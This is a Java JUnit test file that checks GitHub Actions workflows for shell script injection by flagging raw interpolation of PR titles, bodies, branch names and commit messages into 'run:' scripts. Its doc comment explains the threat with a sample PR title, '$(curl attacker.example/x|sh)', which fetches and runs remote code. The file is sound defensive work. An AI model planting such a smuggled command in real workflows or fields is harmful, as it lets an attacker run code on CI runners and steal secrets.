package de.seism0saurus.glacier.ci;

import org.assertj.core.api.SoftAssertions;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Gate 5.9 (WorkflowScriptInjection): no {@code run:} shell script directly interpolates an
 * attacker-controlled GitHub Actions expression — issue/PR titles, bodies, branch names, or
 * review/comment bodies — into the generated shell text.
 *
 * <p>GitHub Actions expands {@code ${{ ... }}} expressions with simple string substitution
 * <em>before</em> the shell ever sees the script. A PR titled
 * {@code $(curl attacker.example/x|sh)} or containing backticks/semicolons in its body,
 * directly interpolated as {@code run: echo "${{ github.event.pull_request.title }}"}, becomes
 * arbitrary shell execution in whatever context that job runs — including a same-repo
 * contributor's own workflow run and, if that job later touches secrets, a straightforward
 * exfiltration path. The safe pattern is to assign the untrusted value to a step- or job-level
 * {@code env:} variable and reference it in the script only as a quoted shell variable
 * ({@code "$VAR"}); the value still reaches the shell, but as data through an environment
 * variable, not as script source text.
 *
 * <h2>Rule enforced</h2>
 * No {@code run:} field (across every workflow, including the reusable {@code _*.yml} core)
 * contains a raw {@code ${{ ... }}} expression referencing {@code title}, {@code body},
 * {@code head_ref}/{@code github.head_ref}, a {@code pull_request.*.ref}-shaped path, or a
 * commit-message/author field ({@code github.event.head_commit.message},
 * {@code github.event.commits.*.message}, {@code github.event.head_commit.author.*} — F-2 fix:
 * {@code quality.yml} triggers on {@code push: branches: ['**']}, so a contributor's own commit
 * message/author fields are attacker-controlled free text on every push, not just on a PR).
 * Only {@code env:}/{@code with:} assignments (a different YAML field, out of this gate's scope
 * by construction — {@link WorkflowStep#run()} only) may carry those expressions; the shell
 * script may then only read them back via {@code $VAR}/{@code "$VAR"}.
 *
 * <p>{@link #noRunScriptDirectlyInterpolatesAnyUnallowlistedGithubEventField()} adds a second,
 * broader net on top of the named-field list above: a blanket ban on any raw
 * {@code ${{ github.event.<anything> }}} interpolation inside {@code run:} text, with an
 * explicit allowlist ({@link #SAFE_EVENT_FIELD_EXPRESSIONS}) for the handful of
 * GitHub-computed numeric/enum fields already in legitimate use elsewhere in these workflows
 * (e.g. {@code github.event.number}). This is the more robust of the two shapes discussed for
 * the F-2 fix — it also catches any future {@code github.event.*} free-text field nobody has
 * enumerated yet — and is kept alongside the named-pattern list rather than replacing it, so a
 * failure message can point precisely at which named field was violated when it matches one.
 *
 * <h2>State</h2>
 * Expected GREEN against every workflow that exists today — none of the current {@code run:}
 * scripts interpolate a title/body/head_ref/PR-ref/commit-message/author expression; the
 * risky-looking interpolations present today ({@code ${{ github.event.number }}},
 * {@code ${{ github.ref_name }}}, {@code ${{ matrix.variant }}}) are numeric/ref-name/enum-shaped
 * GitHub-computed fields, not free-text attacker input, are always routed through {@code env:}
 * or {@code with:} rather than spliced directly into {@code run:} text, and (for
 * {@code github.event.number}) are explicitly allowlisted for the blanket check above. This
 * gate exists as a regression tripwire for future workflow edits (including Lane C's rebuild),
 * not because a live defect was found.
 *
 * <p>Mode applicability: mode-agnostic.
 *
 * <p>OWASP: A03:2021 — Injection. Security requirement: SR-CI-07; ADR-CI-11.
 *
 * @see <a href="https://securitylab.github.com/resources/github-actions-untrusted-input/">
 *      GitHub Security Lab — Keeping your GitHub Actions and workflows secure: Untrusted input</a>
 */
class WorkflowScriptInjectionTest {

    /**
     * Each pattern matches a raw {@code ${{ ... }}} expression whose body references one of
     * the classic attacker-controlled free-text fields. Deliberately narrow (matches only the
     * specific dangerous field names) rather than a blanket "any ${{ github.event... }}" ban,
     * since many safe, non-free-text event fields (numbers, SHAs, enum-like refs) are used
     * throughout these workflows.
     */
    private static final List<Pattern> DANGEROUS_INTERPOLATIONS = List.of(
            Pattern.compile("\\$\\{\\{[^}]*\\.title\\s*\\}\\}"),
            Pattern.compile("\\$\\{\\{[^}]*\\.body\\s*\\}\\}"),
            Pattern.compile("\\$\\{\\{[^}]*\\bhead_ref\\s*\\}\\}"),
            Pattern.compile("\\$\\{\\{\\s*github\\.head_ref\\s*\\}\\}"),
            Pattern.compile("\\$\\{\\{[^}]*pull_request\\.[a-zA-Z_.]*\\bref\\s*\\}\\}"),
            Pattern.compile("\\$\\{\\{[^}]*comment\\.body\\s*\\}\\}"),
            Pattern.compile("\\$\\{\\{[^}]*review\\.body\\s*\\}\\}"),
            Pattern.compile("\\$\\{\\{[^}]*issue\\.title\\s*\\}\\}"),
            // F-2 fix: commit message/author fields are attacker-controlled free text on every
            // push-triggered workflow (quality.yml: push: branches: ['**']) -- any contributor
            // fully controls their own commit's message and author name/email/username.
            Pattern.compile("\\$\\{\\{[^}]*head_commit\\.message\\s*\\}\\}"),
            Pattern.compile("\\$\\{\\{[^}]*commits(?:\\.\\*|\\[[^\\]]*\\])?\\.message\\s*\\}\\}"),
            Pattern.compile("\\$\\{\\{[^}]*head_commit\\.author\\.[a-zA-Z_]+\\s*\\}\\}"),
            Pattern.compile("\\$\\{\\{[^}]*commits(?:\\.\\*|\\[[^\\]]*\\])?\\.author\\.[a-zA-Z_]+\\s*\\}\\}")
    );

    /**
     * GitHub-computed identifiers/enums used in {@code run:} elsewhere in these workflows that
     * cannot carry attacker-chosen shell metacharacters (numeric IDs, workflow-run conclusion
     * enums) — exempt from the blanket {@code github.event.*} ban in
     * {@link #noRunScriptDirectlyInterpolatesAnyUnallowlistedGithubEventField()}. Anything not
     * on this list is treated as potentially attacker-controlled free text.
     */
    private static final Set<String> SAFE_EVENT_FIELD_EXPRESSIONS = Set.of(
            "github.event.number",
            "github.event.workflow_run.id",
            "github.event.workflow_run.conclusion"
    );

    /**
     * Matches any raw {@code ${{ github.event.<path> }}} interpolation, capturing the field
     * path so it can be checked against {@link #SAFE_EVENT_FIELD_EXPRESSIONS}. Deliberately
     * broader than {@link #DANGEROUS_INTERPOLATIONS} (F-2 fix) — this is the "robustestes
     * Muster" alternative discussed for F-2: rather than enumerating every dangerous field
     * name (title, body, head_commit.message, commits.*.message, head_commit.author.* ...),
     * ban the whole {@code github.event.*} surface inside {@code run:} text by default and
     * allowlist only the specific fields already proven safe.
     */
    private static final Pattern EVENT_FIELD_INTERPOLATION =
            Pattern.compile("\\$\\{\\{\\s*(github\\.event\\.[a-zA-Z0-9_.\\[\\]*]+)\\s*\\}\\}");

    @Test
    void noRunScriptDirectlyInterpolatesAttackerControlledEventText() {
        List<WorkflowFile> all = WorkflowInventory.loadAllWorkflows();
        SoftAssertions softly = new SoftAssertions();

        for (WorkflowFile wf : all) {
            for (WorkflowStep step : wf.runSteps()) {
                for (Pattern pattern : DANGEROUS_INTERPOLATIONS) {
                    boolean matches = pattern.matcher(step.run()).find();
                    softly.assertThat(matches)
                            .as("%s step '%s' run: script directly interpolates an "
                                    + "attacker-controlled expression matching /%s/ -- assign it "
                                    + "to an env: variable first and reference it in the shell "
                                    + "only as a quoted \"$VAR\" (SR-CI-07/ADR-CI-11)",
                                    wf.relativePath(), step.name(), pattern.pattern())
                            .isFalse();
                }
            }
        }

        softly.assertAll();
    }

    /**
     * Second net (F-2 fix): a blanket ban on any {@code ${{ github.event.<field> }}}
     * interpolation inside {@code run:} text, unless the exact field expression is on the
     * {@link #SAFE_EVENT_FIELD_EXPRESSIONS} allowlist. Unlike {@link #DANGEROUS_INTERPOLATIONS},
     * this does not need the dangerous field name enumerated up front -- it inverts the
     * default from "allow unless named dangerous" to "deny unless named safe", which is the
     * correct default for an attacker-influenced event payload.
     */
    @Test
    void noRunScriptDirectlyInterpolatesAnyUnallowlistedGithubEventField() {
        List<WorkflowFile> all = WorkflowInventory.loadAllWorkflows();
        SoftAssertions softly = new SoftAssertions();

        for (WorkflowFile wf : all) {
            for (WorkflowStep step : wf.runSteps()) {
                Matcher matcher = EVENT_FIELD_INTERPOLATION.matcher(step.run());
                while (matcher.find()) {
                    String expression = matcher.group(1);
                    softly.assertThat(SAFE_EVENT_FIELD_EXPRESSIONS)
                            .as("%s step '%s' run: script directly interpolates '%s' -- every "
                                    + "github.event.* field is attacker-influenced free text "
                                    + "unless explicitly allowlisted as GitHub-computed "
                                    + "numeric/enum data; assign it to env: first and reference "
                                    + "it in the shell only as a quoted \"$VAR\" "
                                    + "(SR-CI-07/ADR-CI-11, F-2 fix)",
                                    wf.relativePath(), step.name(), expression)
                            .contains(expression);
                }
            }
        }

        softly.assertAll();
    }

    /**
     * Meta-test proving the detectors actually fire on the exact injection shapes they exist
     * to prevent -- a gate whose regex is subtly wrong (e.g. anchored incorrectly) would
     * otherwise report green forever, which is worse than no gate.
     */
    @Test
    void detectorFiresOnAKnownDangerousShape() {
        String dangerous = "echo \"${{ github.event.pull_request.title }}\"";
        boolean anyMatch = DANGEROUS_INTERPOLATIONS.stream().anyMatch(p -> p.matcher(dangerous).find());
        assertThat(anyMatch)
                .as("the DANGEROUS_INTERPOLATIONS pattern set must detect a direct "
                        + "${{ github.event.pull_request.title }} interpolation")
                .isTrue();

        String safe = "echo \"$PR_TITLE\""; // value assigned via env:, referenced as a shell var
        boolean safeMatch = DANGEROUS_INTERPOLATIONS.stream().anyMatch(p -> p.matcher(safe).find());
        assertThat(safeMatch)
                .as("the env:-intermediary + \"$VAR\" pattern must NOT be flagged")
                .isFalse();

        // F-2 fix: commit-message probe -- quality.yml's push: branches: ['**'] trigger makes
        // a contributor's own commit message attacker-controlled free text on every push.
        String dangerousCommitMessage = "echo \"${{ github.event.head_commit.message }}\"";
        boolean commitMessageMatch = DANGEROUS_INTERPOLATIONS.stream()
                .anyMatch(p -> p.matcher(dangerousCommitMessage).find());
        assertThat(commitMessageMatch)
                .as("the DANGEROUS_INTERPOLATIONS pattern set must detect a direct "
                        + "${{ github.event.head_commit.message }} interpolation")
                .isTrue();
        boolean commitMessageBlanketMatch =
                EVENT_FIELD_INTERPOLATION.matcher(dangerousCommitMessage).find();
        assertThat(commitMessageBlanketMatch)
                .as("the blanket github.event.* ban must also detect "
                        + "${{ github.event.head_commit.message }}")
                .isTrue();

        String safeCommitMessage = "echo \"$MSG\""; // value assigned via env:, referenced as a shell var
        boolean commitMessageSafeMatch = DANGEROUS_INTERPOLATIONS.stream()
                .anyMatch(p -> p.matcher(safeCommitMessage).find());
        assertThat(commitMessageSafeMatch)
                .as("the env:-intermediary + \"$MSG\" pattern must NOT be flagged by "
                        + "DANGEROUS_INTERPOLATIONS")
                .isFalse();
        boolean commitMessageSafeBlanketMatch =
                EVENT_FIELD_INTERPOLATION.matcher(safeCommitMessage).find();
        assertThat(commitMessageSafeBlanketMatch)
                .as("the env:-intermediary + \"$MSG\" pattern must NOT be flagged by the "
                        + "blanket github.event.* ban either")
                .isFalse();
    }
}
